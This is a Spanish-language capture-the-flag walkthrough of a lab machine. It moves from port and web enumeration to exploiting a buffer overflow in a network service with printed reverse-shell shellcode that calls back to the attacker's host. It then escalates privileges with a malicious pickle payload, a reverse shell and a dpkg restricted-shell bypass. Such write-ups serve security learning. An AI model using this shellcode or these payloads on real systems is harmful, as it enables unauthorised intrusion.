### Enumeracion de Puertos, Servicios y Versiones
```ruby
nmap -Pn -n -sS -p- --open -sCV --min-rate 2000 172.17.0.2
```
```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-01 06:29 -03
Nmap scan report for 172.17.0.2
Host is up (0.0000020s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 66:db:6e:23:2a:f4:01:ab:3a:41:be:a4:a7:f9:1b:d1 (ECDSA)
|_  256 f3:3e:ee:2e:bb:75:63:ad:bf:7b:1e:84:81:40:2d:92 (ED25519)
80/tcp   open  http        Apache httpd 2.4.62
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Did not follow redirect to http://spainmerides.dl
9000/tcp open  cslistener?
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: Host: 172.17.0.2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.96 seconds
```
puedo observar 3 servicios, puerto 80 (servicio web), puerto 22 (ssh) y otro servicio corriendo en el puerto 9000 (servicio desconocido), asi que chequeo el servicio web pero antes
agrego al archivo `/etc/hosts` el dominio que reporta `nmap`
```ruby
echo '172.17.0.2  spainmerides.dl' >> /etc/hosts
```
![image](https://github.com/user-attachments/assets/4c2c2101-695f-42a1-9d42-e9a92ec0ed75)

![image](https://github.com/user-attachments/assets/fe42bbe7-0cc2-43ef-ac60-253ab60ed92e)

la web es acerca las efemerides espanolas, como no veo nada de interes, le aplico fuzzing web

### Fuzzing
```ruby
feroxbuster -u 'http://spainmerides.dl' -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x txt,php,bak,db,py,html,js,jpg,png,git,sh -t 200 --random-agent --no-state -d 10
```
```ruby
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://spainmerides.dl
 🚀  Threads               │ 200
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ Random
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [txt, php, bak, db, py, html, js, jpg, png, git, sh]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 10
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      280c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       30l       57w      776c http://spainmerides.dl/index.php
200      GET       49l      109w     1532c http://spainmerides.dl/efemerides.php
200      GET       48l       83w      625c http://spainmerides.dl/style.css
200      GET       30l       57w      776c http://spainmerides.dl/
200      GET        4l      103w    17159c http://spainmerides.dl/.archivos-secretos/bitlock
200      GET       61l      106w     1472c http://spainmerides.dl/manager.php
[####################] - 41s  2491620/2491620 0s      found:6       errors:0      
[####################] - 40s  2491548/2491548 62373/s http://spainmerides.dl/ 
[####################] - 0s   2491548/2491548 2491548000/s http://spainmerides.dl/.archivos-secretos/ => Directory listing (add --scan-dir-listings to scan)              
```
observo `manager.php` asi que accedo a el

![image](https://github.com/user-attachments/assets/3338b07c-105b-44ed-8187-421e4fde47b5)

me descargo el archivo `bitlock` (mismo archivo que reporto feroxbuster) y lo chequeo a ver de que trata

![image](https://github.com/user-attachments/assets/811beddf-c878-41c8-bd2e-9255aaf9e8ab)

por lo visto se trata de un binario, lo ejecuto a ver de que va

![image](https://github.com/user-attachments/assets/8bff3f71-7e52-44e8-9978-c26e42d20b1f)

por lo visto este binario debe ser el que se ejecuta del lado del servidor y el que nos reporto `nmap` (el servicio desconocido), comienzo haciendo pruebas

![image](https://github.com/user-attachments/assets/be134461-2d89-4918-8a8a-da7688c3da4c)

testeare si llega ser vulnerable a un `buffer overflow`

![image](https://github.com/user-attachments/assets/5bffc276-d5a5-44c5-8e56-b4b9d693d4aa)

ocurrio un desbordamiento de buffer por lo que intentare ver de que manero logro explotarlo y si llega a ser de utilidad

### Explotando Buffer Overflow

ya que conozco que se trata de un binario de 32bit, ahora chequeare las protecciones
```ruby
checksec --file=bitlock
```

![image](https://github.com/user-attachments/assets/dd5adbe8-2b7c-4c02-952f-dd5db30e8477)

no tiene protecciones activas, asi que ahora calculare el `offset`

```ruby
gdb ./bitlock -q # corro el binario con un depurador
```

![image](https://github.com/user-attachments/assets/5c13be39-0a58-492d-a59e-b95db4d991f7)

ahora creo una cadena con `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb` para enviarla al binario

```ruby
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 100
```

![image](https://github.com/user-attachments/assets/62b52040-65af-4683-942f-71d1a9f75935)

a continuacion se la envio al binario

![image](https://github.com/user-attachments/assets/b30df4e0-228b-4420-88d6-12b2c37937c4)

aqui observo la direccion del registro `eip` asi que ese valor se lo pasamos al siguiente exploit

```ruby
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x61413761
```

![image](https://github.com/user-attachments/assets/57981214-7747-4751-98ef-d7b9b7f4c98f)

obtenemos el valor `offset` que es de 22 byte, ahora testeo si obtengo el control del registro `eip`

![image](https://github.com/user-attachments/assets/0d4ac577-7af8-4eb5-baa6-0614d7e68c90)

logro entonces tomar el control sobre el registro `eip`, sabiendo esto ahora calculo la direccion de la funcion `jmp_esp` que es la que apunta al comienzo de la pila
para intentar incrustar una `shellcode` y debo intentarlo de esta forma ya que el tamano del buffer es muy pequeno para almacenar una `shellcode`

![image](https://github.com/user-attachments/assets/fcfaa5f5-0d80-401e-bb48-2ab8acd87da2)

aqui obtengo la direccion de memoria de la funcion `jmp_esp` a la cual apuntare en el registro `eip` para redirigir el flujo del programa al comienzo de la pila, ahora
confirmare que lo que envie despues de sobreescribir el `eip` se almacene al comienzo de la pila

![image](https://github.com/user-attachments/assets/8d2d5739-b59f-4f60-88f3-8bf3a7d8d543)

tal como pensaba, lo que envie luego de `eip` se va alojar al comienzo de la pila, ahora creare la `shellcode` que inyectare

```ruby
msfvenom -p linux/x86/shell_reverse_tcp LHOST=172.17.0.1 LPORT=4444 -b '\x00\x0a\x0d' -f hex #generamos la shellcode
```
```bash
bbc08f65e8d9ecd97424f45829c9b11231581283c004039881871d2945b03d1a3a6ca89e35739cf888f44e5da3cabddd8a4dc7b5a0bf3744d1bd37577d4bd6e71b1b48545798e3bb5a1fa1530b0f35cbbb60966955f60b3ff6812d0ff35c2d
```

obtenemos una cadena en hexadecimal la cual vamos a modificar para poder inyectarla al binario, la cadena modificada quedaria asi

```ruby
\xbb\xc0\x8f\x65\xe8\xd9\xec\xd9\x74\x24\xf4\x58\x29\xc9\xb1\x12\x31\x58\x12\x83\xc0\x04\x03\x98\x81\x87\x1d\x29\x45\xb0\x3d\x1a\x3a\x6c\xa8\x9e\x35\x73\x9c\xf8\x88\xf4\x4e\x5d\xa3\xca\xbd\xdd\x8a\x4d\xc7\xb5\xa0\xbf\x37\x44\xd1\xbd\x37\x57\x7d\x4b\xd6\xe7\x1b\x1b\x48\x54\x57\x98\xe3\xbb\x5a\x1f\xa1\x53\x0b\x0f\x35\xcb\xbb\x60\x96\x69\x55\xf6\x0b\x3f\xf6\x81\x2d\x0f\xf3\x5c\x2d
```

ya teniendo todo lo necesario testeo si logro inyectar la `shellcode` y para eso primero me coloco en escucha por el puerto `4444` para luego enviar el payload al binario

![image](https://github.com/user-attachments/assets/ccc2b3a4-02a2-4e99-b43a-ebf71f1bb1ed)

logre inyectar correctamente la `shellcode` y obtener asi una `revershell`

Estructura del `payload`
```bash
payload = {offset} + {address jmp_esp} + {NOP's} + {shellcode}
```
ahora en vez de apuntar a la ip `172.17.0.1` que es mi ip, apuntare el `payload` a la ip del servidor `172.17.0.2`

![image](https://github.com/user-attachments/assets/b8eb8980-05f8-4a4a-87cb-532474765c44)

obtengo acceso al servidor!!!!

## Escalada de Privilegios

### www-data

tratamiento de la tty
```ruby
script /dev/null -c bash 
^Z
stty raw -echo; fg
reset xterm
stty rows 38 columns 168
export TERM=xterm
export SHELL=bash
```
observo que puedo ejecutar un script `.py` como el user `maci`

![image](https://github.com/user-attachments/assets/3d520f62-9495-4ffe-a0c2-0291266c3d71)

si ejecuto el binario me arroja el siguiente mensaje

![image](https://github.com/user-attachments/assets/f6ee1a9e-6360-4cb1-9462-edbf507b10e8)

para entender que es lo que hace el script, intento leero

```python
import pickle
import os
file_path = "/opt/data.pk1"
config_file_path = "/home/maci/.time_seri/time.conf"
def load_pickle_file(file_path):
    """Carga un archivo pickle y devuelve su contenido."""
    if not os.path.exists(file_path):
        print(f"El archivo {file_path} no se encontró.")
        return None
    
    try:
        with open(file_path, 'rb') as f:
            data = pickle.load(f)
            return data
    except PermissionError:
        print("No tienes permiso para leer el archivo.")
    except pickle.UnpicklingError:
        print("Error al deserializar el archivo: el archivo puede estar corrupto o no es un archivo pickle válido.")
    except EOFError:
        print("El archivo está vacío o truncado.")
    except Exception as e:
        print(f"Ocurrió un error inesperado: {e}")
    
    return None
def is_serial_enabled(config_file_path):
    """Verifica si la serialización está habilitada en el archivo de configuración."""
    if not os.path.exists(config_file_path):
        print(f"El archivo de configuración {config_file_path} no se encontró.")
        return False
    
    with open(config_file_path, 'r') as config_file:
        for line in config_file:
            if line.startswith('serial='):
                value = line.split('=')[1].strip()
                return value.lower() == 'on'
    
    return False
if __name__ == "__main__":
    if is_serial_enabled(config_file_path):
        data = load_pickle_file(file_path)
        if data is not None:
            print("Datos deserializados correctamente, puedes revisar /tmp")
#            print(data)
    else:
        print("La serialización está deshabilitada. El programa no se ejecutará.")
```

el script lo que hace es deserializar el archivo `/opt/data.pk1`, por otro lado observo una validacion en un archivo de configuracion chequeando como esta seteado
la variable `serial`, si `serial=on`  en `/home/maci/.time_seri/time.conf` deserializa el archivo `/opt/data.pk1`, sino la variable `serial` no es `on` es cuando arroja
el mensaje `La serialización está deshabilitada. El programa no se ejecutará.`; asi que chequeo si puedo llevar a modificar el archivo de configuracion

![image](https://github.com/user-attachments/assets/b075e495-79b6-445e-8bb8-9a2ef8d6ea60)

si es posible modificar el archivo `/home/maci/.time_seri/time.conf` asi que seteo a `on` la variable `serial`

![image](https://github.com/user-attachments/assets/4155fa1b-7cae-4f24-bae2-f405d2179d19)

ya seteada a `on` la variable vuelvo ejecutar el script como el user `maci`

![image](https://github.com/user-attachments/assets/ade6a29e-c229-46c4-880a-16b43e178704)

reviso `tmp` y me consigo con 2 registros `log`

```ruby
cat /tmp/logs.log
se a detenido el programa!, volviendo a ejecutar
se a detenido el programa!, volviendo a ejecutar
se a detenido el programa!, volviendo a ejecutar
se a detenido el programa!, volviendo a ejecutar
se a detenido el programa!, volviendo a ejecutar
se a detenido el programa!, volviendo a ejecutar
```
```ruby
cat /tmp/.data2.log
hola maci, es darksblack recuerda terminar la maquina antes que finalice el mes
```

solo observo un mensaje, pero si vuelvo al script que se encarga de deserializar, recordemos que deserializa el archivo `/opt/data.pk1` y al revisar los permisos
del archivo veo que es posible modificarlo

![image](https://github.com/user-attachments/assets/af56c9ee-a2ae-4b98-a208-897a7081e2e9)

esto puede conducir a una inyeccion de comandos al manipular el archivo que es deserializado por el script que ejecuta el user `maci`, asi que voy a manipular dicho archivo
 con codigo malicioso para que ejecute comandos y obtener entonces una bash como `maci`

 ```python
import pickle
import os
class Malicious:
   def __reduce__(self):
           return (os.system, ('whoami;id',))
   # Serializar el objeto malicioso
with open('/opt/data.pk1', 'wb') as f:
       pickle.dump(Malicious(), f)
```

guardo el script como `/tmp/inyeccion.py`
este script lo que hara sera modificar el contenido del archivo `/opt/data.pk1` inyectando comandos que se ejecutaran cuando se deserialice

```ruby
chmod +x /tmp/inyeccion.py # le damos permisos de ejecucion
```

ahora ejecuto el script `inyeccion.py`

```ruby
python3 inyeccion.py
```
y luego ejecuto el script de deserializacion como el user `maci`

```ruby
sudo -u maci /bin/python3 /home/maci/.time_seri/time.py
```

![image](https://github.com/user-attachments/assets/81f017f2-a2da-476b-8c7f-9e5fe950f92e)

se han ejecuto los comandos que inyecte, ahora cambiare los comandos `whoami;id` por `/bin/bash` quedando el script `inyeccion.py` de la siguiente manera

```ruby
import pickle
import os
class Malicious:
   def __reduce__(self):
           return (os.system, ('/bin/bash',))
   # Serializar el objeto malicioso
with open('/opt/data.pk1', 'wb') as f:
       pickle.dump(Malicious(), f)
```

Ejecuto nuevamente inyeccion.py para modificar el contenido de `/opt/data.pk1` con el comando `/bin/bash` y despues ejecuto
el script de deserializacion como el user `maci` y obtengo la shell como `maci`

![image](https://github.com/user-attachments/assets/c158e82e-2a86-4273-ab01-691a1c0a1bbe)

### maci

con este usuario puedo ejecutar como el user `darksblack` el binario `/usr/bin/dpkg`

![image](https://github.com/user-attachments/assets/6b396ffd-8b6e-4b07-ba10-edf984d5b3f2)

intento escalar pero es un poco mas complicado porque al parecer el user `darksblack` esta dentro de una `-rbash`

```ruby
sudo -u darksblack /usr/bin/dpkg -l
```

![image](https://github.com/user-attachments/assets/34df5620-0f35-414d-aa9d-47b762f72c0b)

intento enviar una revershell pero no lo consigo, asi que la codeo en `base64` y obtengo la `revershell`

![image](https://github.com/user-attachments/assets/e4ea3636-268d-4396-953c-2355a2feac4a)

el problema como ya decia, es que `darksblack` esta dentro de una `rbash` 

![image](https://github.com/user-attachments/assets/cd20eaf7-30bb-42b6-980c-185b8a79b129)

no puedo ejecutar comandos, pero desde dpkg si puedo bypassear la `rbash` y ejecutar comandos asi que termino la `revershell` y testeo desde `dpkg`

![image](https://github.com/user-attachments/assets/c3a00824-5e07-45e5-ab57-b2dc7eca1bbb)

al revisar el directorio de `darksblack` puedo ver un archivo `Olympus` asi que lo copiare a `/tmp` para ver que es

![image](https://github.com/user-attachments/assets/cebc493b-6f1a-41f3-9cfb-b05d594d5b2e)

ya copiado salgo de `dpkg` y reviso `/tmp`

![image](https://github.com/user-attachments/assets/b0cdc14b-d918-40bf-a7e8-d5d86a479715)

es un bianrio y al ejecutarlo pregunta por el modo de acceso, el modo invitado imprime tareas pendientes y el modo `administrador` solicita un serial, que al
colocar cualquier cosa observo un error de permisos (claro, el user maci no puede acceder a la ubicacion indicada), asi que copiare `OlympusValidator` tambien a `/tmp`

![image](https://github.com/user-attachments/assets/b3cada1a-158f-461f-9bba-44723dc26155)

![image](https://github.com/user-attachments/assets/27f20641-c26a-441d-a567-e2dbc1dc6192)

es un segundo binario, testeo si trata de un `bof` pero al parecer no es vulnerable asi que tocara hacer reversing a los binarios

### Reversing a binarios Olympus y OlympusValidator

para hacer reversing paso los binarios a mi maquina atacante

![image](https://github.com/user-attachments/assets/4c9f6588-aa5f-4115-a17f-3e9dae1164c3)

al comenzar analizar el binario `Olympus` con `ghidra` parece que que no contiene informacion sensible, asi que paso analizar el segundo binario `OlympusValidator`

![image](https://github.com/user-attachments/assets/61ac0260-adbd-4ee0-a8bb-6b2f0cfb1b5c)

aqui puedo ver informacion que es impresa pero primero se concatenada

![image](https://github.com/user-attachments/assets/18828ada-f33a-4953-bffa-1ef5470c0dbb)

del lado izquierdo tenemos las instrucciones en ensamblador y del lado derecho esta el codigo decompilado del binario, desde el lado de ensamblador puedo convertir
los valor hexadecimales a texto claro quedando

![image](https://github.com/user-attachments/assets/d0163c5b-03a1-4e34-890f-9c28e1889f87)

lo que tiene buena pinta de ser un serial, pero si nos fijamos mejor en el codigo decompilado, vemos un llamado a la funcion `spoof()` cuando el serial es `VALIDO`
asi que busco dicha funcion a ver que contiene

![image](https://github.com/user-attachments/assets/2b2bbc0d-9b8b-4400-b049-8db53a179701)

![image](https://github.com/user-attachments/assets/1efdad84-e66a-4edc-ac6e-71f590177479)

mas informacion y esta parece ser de mayor interes, podria entonces aplicar la misma estrategia que use anteriormente para dar con lo que parece ser un serial (aun no lo testeo)

![image](https://github.com/user-attachments/assets/9ed627b9-8f1d-4b8a-9aab-8bb74982f0c7)

aqui tengo el fragmento en ensamblador que al pasarlo a texto queda

https://github.com/user-attachments/assets/7276f024-db97-4ec0-a31e-bc2b03a68465

claramente se puede leer `credenciales ssh root:***` asi que pruebo las credenciales directamente via `ssh`

![image](https://github.com/user-attachments/assets/4b169183-2d37-442b-a23c-7dda626625f0)

### PWNED - ROOT

haciendo reversing he obtenido las credenciales via ssh del user `root`, aunque ahora despues de conseguir el acceso probare si lo primero que consegui se
trataba del serial para acceder al modo administrador asi que en `ghidra` vuelvo a la funcion `main`

![image](https://github.com/user-attachments/assets/631d7058-f0d6-4880-bc32-5c1dcbde9950)

posible serial

```bash
A678-GHS3-OLP0-QQP1-DFMZ
```

![image](https://github.com/user-attachments/assets/a7d82ab7-8647-4294-9d57-68e752ad8409)

en efecto era el serial para el binario, de alguna u otra forma igual daria con las credenciales `ssh`




